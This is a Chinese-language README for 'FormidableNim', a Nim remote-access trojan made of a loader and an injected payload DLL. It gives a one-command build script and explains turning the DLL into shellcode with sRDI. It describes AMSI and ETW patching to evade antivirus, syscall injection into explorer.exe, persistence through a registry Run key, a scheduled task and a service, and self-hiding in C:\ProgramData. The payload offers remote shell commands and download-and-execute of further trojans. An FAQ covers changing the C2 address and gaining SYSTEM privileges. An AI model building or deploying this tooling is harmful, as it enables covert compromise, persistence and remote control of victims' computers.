# FormidableNim - 高级免杀加载器与 Payload

Formidable2026 的 Nim 语言版本，包含两个核心组件：
1.  **FormidableNim.exe (Loader)**: 一个高度隐蔽的加载器，负责免杀、持久化和注入。
2.  **payload.dll (Payload)**: 实际的远控功能模块，被注入到系统进程中运行。

## 目录结构

-   `src/nim_client.nim`: **Loader 源码**。负责自启动、免杀 (AMSI/ETW)、寻找 Explorer 进程并注入 Payload。
-   `src/payload.nim`: **Payload 源码**。包含网络通信、命令执行、文件管理等核心功能。
-   `build_loader.py`: **自动化构建脚本**。一键编译 Payload、转换 Shellcode、编译 Loader。

## 快速构建 (Build)

本项目提供了一键构建脚本 `build_loader.py`。

### 前置要求
1.  **Nim 编译器**: 确保 `tools/nim-2.2.0/bin/nim.exe` 存在，或 Nim 在系统 PATH 中。
2.  **Python 3**: 用于运行构建脚本。
3.  **(关键) sRDI 工具**: 用于将 `payload.dll` 转换为 Shellcode。
    *   **必须手动集成**: 下载 [sRDI](https://github.com/monoxgas/sRDI)
    *   将 `ConvertToShellcode.py` 及其依赖放置在 `utils/` 目录（需自行创建）。
    *   *注意：如果未集成 sRDI，脚本将使用原始 DLL 字节作为占位符，**注入后会导致目标进程崩溃**。*

### 构建步骤
在命令行中运行：
```bash
python build_loader.py
```

脚本将执行以下操作：
1.  编译 `src/payload.nim` -> `payload.dll` (无依赖的纯 DLL)。
2.  调用 sRDI (如果存在) 将 DLL 转为 `payload.bin` (Shellcode)。
3.  读取 Shellcode 并替换 `src/nim_client.nim` 中的 `clientPayload` 常量。
4.  编译 `src/nim_client.nim` -> `FormidableNim.exe`。

## 功能特性

### Loader (FormidableNim.exe)
*   ✅ **高级免杀**: 内置 AMSI (反恶意软件扫描接口) 和 ETW (事件追踪) Patch。
*   ✅ **进程注入**: 使用 Syscall (`NtOpenProcess`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) 将 Payload 注入到 `explorer.exe`，实现无文件落地运行。
*   ✅ **全方位持久化**:
    *   **注册表**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
    *   **计划任务**: 创建高权限登录触发任务。
    *   **系统服务**: 注册为自动启动服务 (需管理员权限)。
*   ✅ **自我安装**: 自动复制到 `C:\ProgramData` 并自我隐藏。

### Payload (payload.dll)
*   ✅ **系统信息**: 上报计算机名、用户名、OS 版本、进程 ID 等，在服务端正确上线。
*   ✅ **远程命令**: 支持 `CMD_SHELL_EXEC` 执行 CMD 命令。
*   ✅ **文件管理**: 支持 `CMD_FILE_LIST` 列出目录文件。
*   ✅ **下载执行**: 支持 `CMD_DOWNLOAD_EXEC` 远程下载并执行木马。
*   ✅ **心跳维持**: 稳定的心跳包机制保持连接。

## 常见问题

**Q: 为什么运行生成的 EXE 后 explorer.exe 崩溃了？**
A: 这是因为你没有正确集成 sRDI。构建脚本默认仅将 DLL 文件内容作为 Shellcode 填入。DLL 不是 Shellcode，直接注入执行会导致崩溃。请务必使用 sRDI 或 Donut 生成真正的 Shellcode。

**Q: 如何修改 C2 地址？**
A: 修改 `src/payload.nim` 中的 `init_default_config` 函数。

**Q: 服务端显示上线了，但无法执行命令？**
A: 请检查 Payload 的权限。注入到 Explorer 通常拥有当前用户权限。如果需要系统权限，请尝试以管理员身份运行 Loader，它会尝试创建服务持久化，重启后将以 SYSTEM 权限运行。
